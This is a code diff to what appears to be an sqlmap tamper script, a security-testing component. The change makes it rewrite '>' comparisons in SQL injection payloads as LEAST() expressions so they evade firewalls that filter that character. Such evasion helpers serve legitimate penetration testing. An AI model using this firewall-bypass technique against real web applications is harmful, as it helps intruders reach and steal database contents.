@@ -16,7 +16,7 @@ def dependencies():
 
 def tamper(payload, **kwargs):
     """
-    Replaces greater than operator ('>') with 'GREATEST' counterpart
+    Replaces greater than operator ('>') with 'LEAST' counterpart
 
     Tested against:
         * MySQL 4, 5.0 and 5.5
@@ -26,11 +26,11 @@ def tamper(payload, **kwargs):
     Notes:
         * Useful to bypass weak and bespoke web application firewalls that
           filter the greater than character
-        * The GREATEST clause is a widespread SQL command. Hence, this
+        * The LEAST clause is a widespread SQL command. Hence, this
           tamper script should work against majority of databases
 
     >>> tamper('1 AND A > B')
-    '1 AND GREATEST(A,B+1)=A'
+    '1 AND LEAST(A,B+1)=B+1'
     """
 
     retVal = payload
@@ -39,7 +39,7 @@ def tamper(payload, **kwargs):
         match = re.search(r"(?i)(\b(AND|OR)\b\s+)([^>]+?)\s*>\s*(\w+|'[^']+')", payload)
 
         if match:
-            _ = "%sGREATEST(%s,%s+1)=%s" % (match.group(1), match.group(3), match.group(4), match.group(3))
+            _ = "%sLEAST(%s,%s+1)=%s+1" % (match.group(1), match.group(3), match.group(4), match.group(4))
             retVal = retVal.replace(match.group(0), _)
 
     return retVal
